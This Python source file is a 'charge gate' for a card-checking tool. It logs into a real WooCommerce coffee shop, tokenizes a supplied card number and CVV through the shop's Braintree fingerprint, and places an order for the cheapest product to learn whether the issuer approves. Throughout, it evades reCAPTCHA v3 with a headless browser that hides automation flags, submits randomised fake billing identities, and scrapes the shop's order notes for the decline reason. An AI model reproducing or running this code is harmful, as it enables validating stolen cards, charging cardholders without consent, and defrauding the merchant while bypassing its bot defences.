"""The WooCommerce charge gate.

The card is charged at a real shop, so the answer is the issuer's own
word: the shop asks the issuer when the order is paid for, and the
refusal comes back in the shop's answer and in the note the shop keeps
on the order.

Two things stand between a plain request and that answer:

  * the shop puts a google reCAPTCHA v3 on its checkout.  The token is
    made by the page's own javascript, so the browser opens the
    checkout and takes the token the page holds,
  * the card itself is turned into a braintree token with the shop's
    own fingerprint, the way the shop's javascript would do it.

Nothing is charged when the issuer refuses the card.  When the issuer
says yes, the order goes through and the card is charged the price of
the product on the shop.
"""
import asyncio
import base64
import html
import json
import os
import random
import re
import string
import sys
import time
import uuid

import httpx

sys.path.insert(0, os.path.dirname(__file__))
from braintree_idt import (account_stores, _chosen_store, _tokenize_card,
                           _parse_card_info, UA)

# The product to buy.  It is the cheapest one on the shop.
DEFAULT_PRODUCT = "/product/kaffn8-liquid-caffeine/"
PRODUCT_FALLBACKS = (
    "/product/kaffn8-liquid-caffeine-3-pack/",
    "/product/kaffn8-liquid-caffeine-4-pack/",
)

NAMES = (("James", "Smith"), ("John", "Williams"), ("Robert", "Jones"),
         ("Michael", "Brown"), ("David", "Miller"), ("Mary", "Wilson"))
STREETS = ("123 Main Street", "45 Oak Avenue", "78 Pine Road", "12 Elm Court",
           "901 Market Street", "34 Sunset Boulevard")


def _email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _address():
    first, last = random.choice(NAMES)
    return {"first_name": first, "last_name": last, "company": "",
            "country": "US", "address_1": random.choice(STREETS), "address_2": "",
            "city": "New York", "state": "NY", "postcode": "10001",
            "phone": "212555%04d" % random.randint(0, 9999),
            "email": _email()}


def _page_int(text, pattern, default=""):
    m = re.search(pattern, text or "")
    return m.group(1) if m else default


async def _empty_basket(client, base):
    """The basket belongs to the account, so it has to be emptied first."""
    for _ in range(6):
        r = await client.get(base + "/cart/")
        links = re.findall(r'href=["\']([^"\']*remove_item=[^"\']*)["\']', r.text)
        if not links:
            break
        for link in links:
            url = html.unescape(link)
            try:
                await client.get(url if url.startswith("http") else base + url)
            except Exception:
                pass


async def _pick_product(client, base):
    """The product to buy, and its id."""
    for page_path in (DEFAULT_PRODUCT,) + PRODUCT_FALLBACKS:
        try:
            r = await client.get(base + page_path)
        except Exception:
            continue
        pid = re.findall(r'name=["\']add-to-cart["\'][^>]*value=["\'](\d+)["\']', r.text)
        if pid:
            return page_path, pid[0]
    return None, None


async def _fingerprint(client, base, store):
    """The shop hands out a braintree fingerprint with its client token."""
    r = await client.get(base + "/my-account/add-payment-method/",
                         headers={"Referer": base + "/my-account/payment-methods/"})
    ctn = _page_int(r.text, r'"client_token_nonce"\s*:\s*"([^"]+)"')
    if not ctn:
        return ""
    r = await client.post(
        base + "/wp-admin/admin-ajax.php",
        headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "Origin": base, "Referer": base + "/my-account/add-payment-method/",
                 "X-Requested-With": "XMLHttpRequest"},
        data={"action": (store.get("client_token_action")
                         or "wc_braintree_credit_card_get_client_token"),
              "nonce": ctn, "security": ctn})
    try:
        raw = r.json().get("data")
    except Exception:
        raw = None
    if isinstance(raw, dict):
        raw = raw.get("clientToken")
    try:
        return json.loads(base64.b64decode(raw))["authorizationFingerprint"]
    except Exception:
        return ""


async def _login(client, base, store):
    """Log in to the shop."""
    r = await client.get(base + "/my-account/")
    m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text)
    if not m:
        return False
    await client.post(
        base + "/my-account/",
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Origin": base, "Referer": base + "/my-account/"},
        data={"username": store.get("user"), "password": store.get("password"),
              "rememberme": "forever", "woocommerce-login-nonce": m.group(1),
              "_wp_http_referer": "/my-account/", "login": "Log in"})
    return any(c.name.startswith("wordpress_logged_in") for c in client.cookies.jar)


_browser_state = {"browser": None, "playwright": None}


async def _get_browser():
    """The browser of this gate.

    The google token is made in the browser and sent with the order, so
    the browser has to look like a visitor.  One browser is kept for all
    the checks, so a card is not slow to start.
    """
    if _browser_state["browser"] is not None:
        try:
            if _browser_state["browser"].is_connected():
                return _browser_state["browser"]
        except Exception:
            pass
    try:
        from playwright.async_api import async_playwright
    except Exception:
        return None
    try:
        if _browser_state["playwright"] is None:
            _browser_state["playwright"] = await async_playwright().start()
        _browser_state["browser"] = await _browser_state["playwright"].chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
                  "--disable-gpu", "--disable-blink-features=AutomationControlled"])
    except Exception:
        _browser_state["browser"] = None
    return _browser_state["browser"]


async def _page_of_the_checkout(client, base):
    """The checkout as the browser sees it.

    The page's own javascript makes the google token and puts it in the
    page, so the token is taken from there and not made again here: a
    second token turns the first one bad.
    """
    browser = await _get_browser()
    if browser is None:
        return None

    ctx = None
    try:
        ctx = await browser.new_context(user_agent=UA,
                                        viewport={"width": 1280, "height": 1000},
                                        locale="en-US")
        await ctx.add_init_script(
            "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        await ctx.add_cookies([
            {"name": c.name, "value": c.value, "domain": ".kaffn8.com", "path": "/"}
            for c in client.cookies.jar])
        page = await ctx.new_page()
        await page.goto(base + "/checkout/", wait_until="domcontentloaded", timeout=60000)

        # the page makes the token a moment after it opens
        token = ""
        for _ in range(20):
            await page.wait_for_timeout(1500)
            token = await page.evaluate("""() => {
                const t = document.querySelector('.i13_checkout_token');
                const f = document.querySelector('.fallback_i13_checkout_token');
                return (t && t.value) ? t.value : ((f && f.value) ? f.value : '');
            }""")
            if token:
                break
        if not token:
            await ctx.close()
            return None

        body = await page.content()
        out = {
            "token": token,
            "nonce": _page_int(body, r"recaptcha_i13_nonce\s*=\s*'([^']+)'"),
            "checkout_nonce": _page_int(
                body, r'name=["\']woocommerce-process-checkout-nonce["\'][^>]*value=["\']([^"\']+)'),
            "shipping": _page_int(
                body, r'name=["\']shipping_method\[\d+\]["\'][^>]*value=["\']([^"\']+)["\']',
                "free_shipping:1"),
            "payment": _page_int(body, r'"(braintree[_a-z]*credit[_a-z]*card)"',
                                 "braintree_credit_card"),
            "total": "",
        }
        m = re.search(r'order-total[^>]*>(.*?)</td>', body, re.S)
        if m:
            out["total"] = " ".join(re.sub(r"<[^>]+>", " ", m.group(1)).split())

        # the cookies the page picked up go back with the order
        try:
            for cookie in await ctx.cookies():
                client.cookies.set(cookie["name"], cookie["value"],
                                   domain=cookie.get("domain", ".kaffn8.com"), path="/")
        except Exception:
            pass
        await ctx.close()
        return out
    except Exception:
        try:
            if ctx is not None:
                await ctx.close()
        except Exception:
            pass
        return None


async def _order_notes(client, base):
    """What the shop wrote down about the last order.

    The checkout answer is a general sentence, but the shop keeps the
    payment's own words in the order.  That is the issuer's word.
    """
    try:
        r = await client.get(base + "/my-account/")
        path = _page_int(r.text, r'href=["\']([^"\']*orders[^"\']*)["\']', "")
        if not path:
            return ""
        r = await client.get(path if path.startswith("http") else base + path)
        notes = re.findall(r'<td[^>]*class=["\'][^"\']*order-note[^"\']*["\'][^>]*>(.*?)</td>',
                           r.text, re.S)
        if not notes:
            notes = re.findall(r'<tr[^>]*order-note[^>]*>(.*?)</tr>', r.text, re.S)
        out = []
        for note in notes[:3]:
            plain = " ".join(re.sub(r"<[^>]+>", " ", note).split())
            if plain and plain not in out:
                out.append(plain)
        return " | ".join(out)[:240]
    except Exception:
        return ""


async def wc_braintree_charge_check(cc, mm, yy, cvv):
    """Charge the card at the shop and say what the issuer said."""
    start = time.time()
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    store = None
    for candidate in _chosen_store(account_stores()):
        if candidate.get("url") and candidate.get("user"):
            store = candidate
            break
    if store is None:
        return "Error - no store could take the order [0.0s]"

    base = store["url"].rstrip("/")

    client_kwargs = dict(timeout=httpx.Timeout(45.0), max_redirects=10, follow_redirects=True,
                          headers={"User-Agent": UA,
                                   "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                                   "Accept-Language": "en-US,en;q=0.9"})
    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            if not await _login(client, base, store):
                return f"Error - the shop did not accept the login [{round(time.time() - start, 2)}s]"

            await _empty_basket(client, base)
            product, pid = await _pick_product(client, base)
            if not pid:
                return f"Error - the shop has nothing to sell [{round(time.time() - start, 2)}s]"
            await client.post(base + "/?add-to-cart=" + pid,
                              data={"add-to-cart": pid, "quantity": "1"})

            # The card becomes a token the way the shop's own javascript
            # does it.
            fingerprint = await _fingerprint(client, base, store)
            if not fingerprint:
                return f"Error - the shop gave no braintree fingerprint [{round(time.time() - start, 2)}s]"
            token, card_info, err = await _tokenize_card(client, fingerprint, cc, mm, yy, cvv)
            if not token:
                return f"Declined - {err or 'the card was not accepted'} [{round(time.time() - start, 2)}s]"
            info = _parse_card_info(card_info) if card_info else "??"

            # The order is placed with the token the shop's own page
            # made.  That token is refused now and then, so a second
            # try is made with a new one.
            answer = None
            plain = ""
            for attempt in range(3):
                page = await _page_of_the_checkout(client, base)
                if not page:
                    if attempt == 2:
                        return f"Error - the shop's google check gave nothing [{round(time.time() - start, 2)}s]"
                    continue
                if not page.get("checkout_nonce"):
                    if attempt == 2:
                        return f"Error - the shop gave no checkout nonce [{round(time.time() - start, 2)}s]"
                    continue

                # the order
                amount = page["total"].replace("Total $", "").replace("$", "").strip()
                addr = _address()
                data = {
                    "woocommerce-process-checkout-nonce": page["checkout_nonce"],
                    "shipping_method[0]": page["shipping"],
                    "payment_method": page["payment"],
                    "wc-braintree-credit-card-card-nonce": token,
                    "wc-braintree-credit-card-card-type": str(
                        card_info.get("brandCode") or "visa").lower(),
                    "wc-braintree-credit-card-3d-secure-enabled": "",
                    "wc-braintree-credit-card-3d-secure-verified": "",
                    "wc-braintree-credit-card-3d-secure-order-total": amount,
                    "wc-braintree-credit-card-device-data": json.dumps({"correlation_id": str(uuid.uuid4())}),
                    "wc_braintree_credit_card_payment_nonce": token,
                    "wc_braintree_device_data": json.dumps({"correlation_id": str(uuid.uuid4())}),
                    "wc-braintree-paypal-context": "shortcode",
                    "i13_checkout_token": page["token"],
                    "fallback_i13_checkout_token": page["token"],
                    "recaptcha_token_v3": page["token"],
                    "recaptcha_i13_nonce": page["nonce"],
                    "terms": "on",
                    "terms-field": "1",
                    "_wp_http_referer": "/checkout/",
                }
                for key, value in addr.items():
                    data["billing_" + key] = value
                    data["shipping_" + key] = value

                r = await client.post(
                    base + "/?wc-ajax=checkout", data=data,
                    headers={"User-Agent": UA,
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "application/json, text/javascript, */*; q=0.01",
                             "X-Requested-With": "XMLHttpRequest",
                             "Origin": base, "Referer": base + "/checkout/"})
                try:
                    answer = r.json()
                except Exception:
                    return f"Error - the shop gave no answer [{round(time.time() - start, 2)}s]"

                if answer.get("result") == "success":
                    elapsed = round(time.time() - start, 2)
                    return f"Approved - Charged {page['total'] or '$0'} | {info} [{elapsed}s]"

                messages = str(answer.get("messages") or "")
                plain = " ".join(re.sub(r"<[^>]+>", " ", messages).split())
                plain = plain.replace("|", " ").strip()

                # the google token was refused, so a new one is made
                if "recaptcha" in plain.lower() and attempt < 2:
                    await asyncio.sleep(3)
                    continue
                break

            elapsed = round(time.time() - start, 2)
            notes = await _order_notes(client, base)
            if notes:
                plain = (plain + " -- " + notes).strip()
            if not plain:
                plain = "the shop refused the order"
            return f"Declined - {plain[:190]} | {info} [{elapsed}s]"
    except httpx.TimeoutException:
        return f"Error - the shop did not answer in time [{round(time.time() - start, 2)}s]"
    except Exception as e:
        return f"Error - {type(e).__name__}: {str(e)[:70]} [{round(time.time() - start, 2)}s]"
